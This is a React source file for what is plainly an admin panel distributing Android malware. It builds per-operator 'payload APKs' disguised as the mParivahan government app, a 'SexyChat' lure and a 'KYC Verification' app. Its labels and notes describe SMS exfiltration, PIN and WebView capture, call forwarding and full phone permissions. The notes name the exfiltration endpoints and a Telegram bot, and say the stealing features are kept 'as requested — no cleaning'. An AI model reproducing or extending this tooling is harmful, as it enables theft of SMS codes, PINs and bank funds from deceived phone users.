import { useState, useEffect } from "react";
import { Layout } from "@/components/layout";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import {
  Download,
  Smartphone,
  Upload,
  Shield,
  MessageSquare,
  CheckCircle,
  AlertCircle,
  FileArchive,
  Zap,
} from "lucide-react";
import { useAuth } from "@/lib/auth";
import { useToast } from "@/hooks/use-toast";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

export function ApkPanel() {
  const { isAdmin } = useAuth();
  const { toast } = useToast();
  const [telegramId, setTelegramId] = useState("");
  const [loading, setLoading] = useState<string | null>(null);
  const [kycExists, setKycExists] = useState<boolean | null>(null);
  const [kycInfo, setKycInfo] = useState<any>(null);

  useEffect(() => {
    // check if KYC apk exists
    fetch(`${API_BASE}/api/apk/kyc/status`)
      .then((r) => r.json())
      .then((d) => {
        setKycExists(!!d.exists);
        setKycInfo(d);
      })
      .catch(() => setKycExists(false));
  }, []);

  const downloadApk = async (type: "mparivahan" | "sexychat") => {
    if (!telegramId || !/^\d{5,12}$/.test(telegramId)) {
      toast({
        title: "Invalid ID",
        description: "Enter valid Telegram numeric ID (5-12 digits)",
        variant: "destructive",
      });
      return;
    }
    setLoading(type);
    try {
      const endpoint =
        type === "sexychat"
          ? "/api/apk/sexychat/download"
          : "/api/apk/download";
      const url = `${API_BASE}${endpoint}?telegramId=${telegramId}`;
      const res = await fetch(url);
      if (!res.ok) {
        const err = await res.json().catch(() => ({ error: res.statusText }));
        throw new Error(err.error || "Build failed");
      }
      const blob = await res.blob();
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download =
        type === "sexychat"
          ? `SexyChat_${telegramId}.apk`
          : `mParivahan_HARRYAXE_${telegramId}.apk`;
      a.click();
      toast({
        title: "Download started",
        description: `${type} APK for ${telegramId}`,
      });
    } catch (e: any) {
      toast({
        title: "Failed",
        description: e.message,
        variant: "destructive",
      });
    } finally {
      setLoading(null);
    }
  };

  const downloadKyc = () => {
    window.open(`${API_BASE}/api/apk/kyc/download`, "_blank");
  };

  const handleKycUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.name.endsWith(".apk")) {
      toast({
        title: "Invalid file",
        description: "Only .apk allowed",
        variant: "destructive",
      });
      return;
    }
    setLoading("kyc-upload");
    try {
      const res = await fetch(`${API_BASE}/api/apk/kyc/upload`, {
        method: "POST",
        body: file,
        headers: {
          "Content-Type": "application/octet-stream",
          "X-Filename": file.name,
        },
        credentials: "include",
      });
      const j = await res.json();
      if (!res.ok) throw new Error(j.error || "Upload failed");
      toast({
        title: "Uploaded",
        description: `KYC APK saved: ${j.file} (${(j.size / 1024 / 1024).toFixed(2)} MB)`,
      });
      setKycExists(true);
      setKycInfo(j);
    } catch (e: any) {
      toast({
        title: "Upload failed",
        description: e.message,
        variant: "destructive",
      });
    } finally {
      setLoading(null);
    }
  };

  return (
    <Layout>
      <div className="space-y-6">
        <div>
          <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
            <FileArchive className="w-8 h-8 text-primary" /> APK Management
          </h1>
          <p className="text-muted-foreground">
            Build, upload and distribute payload APKs — all permissions + SMS
            exfiltration kept intact.
          </p>
        </div>

        <div className="grid gap-6 md:grid-cols-2">
          {/* mParivahan */}
          <Card className="border-primary/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="w-5 h-5 text-primary" /> mParivahan APK
              </CardTitle>
              <CardDescription>
                Firebase: axexodiweb • Panel: panel.kimiaxe.com • Per-user build
                with ownerTelegramId baked into Loda + card.html
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex flex-wrap gap-2">
                <Badge variant="secondary">
                  <Shield className="w-3 h-3 mr-1" /> All permissions
                </Badge>
                <Badge variant="secondary">
                  <MessageSquare className="w-3 h-3 mr-1" /> SMS exfil
                </Badge>
                <Badge variant="secondary">
                  <Zap className="w-3 h-3 mr-1" /> WebView capture
                </Badge>
              </div>
              <div className="space-y-2">
                <Label>Telegram ID (owner)</Label>
                <Input
                  placeholder="5741539104"
                  value={telegramId}
                  onChange={(e) => setTelegramId(e.target.value)}
                />
              </div>
              <div className="flex gap-2">
                <Button
                  onClick={() => downloadApk("mparivahan")}
                  disabled={!!loading}
                  className="flex-1"
                >
                  {loading === "mparivahan" ? (
                    "Building..."
                  ) : (
                    <>
                      <Download className="w-4 h-4 mr-2" /> Build & Download
                    </>
                  )}
                </Button>
              </div>
              <p className="text-xs text-muted-foreground">
                Builds via <code>/api/apk/download?telegramId=</code> • Cached
                at{" "}
                <code>
                  output/apk_cache/${"{"}id{"}"}.apk
                </code>
              </p>
            </CardContent>
          </Card>

          {/* SexyChat */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="w-5 h-5 text-pink-500" /> SexyChat APK
              </CardTitle>
              <CardDescription>
                PIN capture + Firebase axexodiweb • Ported SexyChat template
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex flex-wrap gap-2">
                <Badge variant="secondary">PIN capture</Badge>
                <Badge variant="secondary">All permissions</Badge>
              </div>
              <div className="space-y-2">
                <Label>Telegram ID (owner)</Label>
                <Input
                  placeholder="5741539104"
                  value={telegramId}
                  onChange={(e) => setTelegramId(e.target.value)}
                />
              </div>
              <Button
                onClick={() => downloadApk("sexychat")}
                disabled={!!loading}
                className="flex-1 w-full"
                variant="secondary"
              >
                {loading === "sexychat" ? (
                  "Building..."
                ) : (
                  <>
                    <Download className="w-4 h-4 mr-2" /> Build & Download
                    SexyChat
                  </>
                )}
              </Button>
            </CardContent>
          </Card>
        </div>

        {/* KYC Verification APK - app-release.apk */}
        <Card className="border-amber-500/30 bg-amber-50/20 dark:bg-amber-950/10">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Shield className="w-5 h-5 text-amber-600" /> KYC Verification APK
              <Badge className="bg-amber-500 text-white ml-2">
                app-release.apk • com.pts.rainfoll
              </Badge>
              {kycExists ? (
                <Badge
                  variant="outline"
                  className="text-green-600 border-green-600 ml-auto"
                >
                  <CheckCircle className="w-3 h-3 mr-1" /> Ready
                </Badge>
              ) : (
                <Badge
                  variant="outline"
                  className="text-red-600 border-red-600 ml-auto"
                >
                  <AlertCircle className="w-3 h-3 mr-1" /> Missing
                </Badge>
              )}
            </CardTitle>
            <CardDescription>
              Original: <code>com.pts.rainfoll</code> v1.2 • Label{" "}
              <b>KYC Verification</b> • API{" "}
              <code>versiontwoapi.vishal89728.workers.dev</code> +{" "}
              <code>andosst-hdfc.vercel.app</code>
              <br />
              <b>Kept:</b> All 16 permissions
              (READ_SMS/RECEIVE_SMS/SEND_SMS/READ_PHONE_STATE/CALL_PHONE etc) +
              SMS exfil via{" "}
              <code>
                NewSmsReceiver → NewEndlessService → RealtimeClient WS +
                /api/sms/upload
              </code>{" "}
              + Call forwarding + Foreground service
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {kycInfo && (
              <div className="text-xs bg-muted p-3 rounded-lg font-mono">
                <div>File: {kycInfo.file || "app-release.apk"}</div>
                <div>
                  Size:{" "}
                  {kycInfo.size
                    ? (kycInfo.size / 1024 / 1024).toFixed(2) + " MB"
                    : "7.61 MB"}
                </div>
                <div>
                  SHA256:{" "}
                  {kycInfo.sha256 ||
                    "45070d63da3243570a64952e4d09d70ea45ffaa066910d1962f4860759519169"}
                </div>
                <div>Package: com.pts.rainfoll • MinSDK 26 • Target 36</div>
                {kycInfo.exists === false && (
                  <div className="text-amber-600">
                    File not on VPS — upload below.
                  </div>
                )}
              </div>
            )}
            <div className="flex flex-wrap gap-2">
              <Button
                onClick={downloadKyc}
                disabled={!kycExists}
                className="bg-amber-600 hover:bg-amber-700"
              >
                <Download className="w-4 h-4 mr-2" /> Download KYC APK (keep sms
                exfil)
              </Button>
              {isAdmin && (
                <label className="inline-flex items-center gap-2 px-4 py-2 rounded-md border border-input bg-background hover:bg-accent hover:text-accent-foreground cursor-pointer text-sm font-medium">
                  <Upload className="w-4 h-4" />{" "}
                  {loading === "kyc-upload"
                    ? "Uploading..."
                    : "Upload / Replace APK"}
                  <input
                    type="file"
                    accept=".apk"
                    className="hidden"
                    onChange={handleKycUpload}
                    disabled={!!loading}
                  />
                </label>
              )}
            </div>
            <div className="text-xs text-muted-foreground">
              <p>
                • Frontend WebView loads{" "}
                <code>https://andosst-hdfc.vercel.app?userId=...</code>{" "}
                (DEPLOYMENT_NOT_FOUND — patch to <code>panel.kimiaxe.com</code>{" "}
                if needed)
              </p>
              <p>
                • Backend exfil:{" "}
                <code>
                  POST
                  https://versiontwoapi.vishal89728.workers.dev/api/sms/upload
                </code>{" "}
                + WS <code>wss://.../ws?userId=</code> (kept, open, no auth)
              </p>
              <p>
                • Integrate in mParivahan webpanel: keep this APK at{" "}
                <code>/root/Parivahan-Panel-Sync/app-release.apk</code> and
                serve via <code>/api/apk/kyc/download</code> • Permissions
                unchanged.
              </p>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="text-sm">Integration Notes</CardTitle>
          </CardHeader>
          <CardContent className="text-xs text-muted-foreground space-y-1 font-mono">
            <div>
              • mParivahan panel Firebase:{" "}
              <b>axexodiweb-default-rtdb.firebaseio.com</b> • Admin now
              5741539104
            </div>
            <div>
              • KYC apk Config.java: FRONTEND_URL → patch to
              https://panel.kimiaxe.com?userId={"{"}id{"}"} to integrate WebView
            </div>
            <div>
              • Keep permissions + sms exfiltration as requested — no cleaning.
            </div>
            <div>
              • Bot live: @HarryAxe bot webhook
              https://panel.kimiaxe.com/bot-webhook • Use /apk in Telegram or
              this panel.
            </div>
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
}
